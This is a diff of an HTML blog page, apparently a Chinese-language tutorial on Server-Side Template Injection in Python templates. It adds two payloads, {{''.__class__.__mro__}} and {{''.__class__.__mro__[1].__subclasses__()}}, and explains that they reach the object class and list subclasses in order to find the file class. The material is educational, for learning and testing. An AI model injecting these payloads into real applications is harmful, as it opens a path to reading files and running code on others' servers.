@@ -266,8 +266,10 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>将<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.\__class__.\__mro__[1].\__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<p>注入到SSTI漏洞点当中</p>
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.\__class__.\__mro__ &#125;&#125; 作为payload注入到SSTI漏洞点当中，</span><br></pre></td></tr></table></figure>
+<p>使用索引1来选择object类。现在我们到达了object类，我们使用<strong>subclasses</strong>属性来dump应用程序中使用的所有类（找到file类的索引）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.\__class__.\__mro__[1].\__subclasses__() &#125;&#125; 注入到SSTI漏洞点当中</span><br></pre></td></tr></table></figure>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/0~652%7BPZW@3O~V%25RBZ%25~IX1.png" alt="image">　</p>
 
       
     </div>
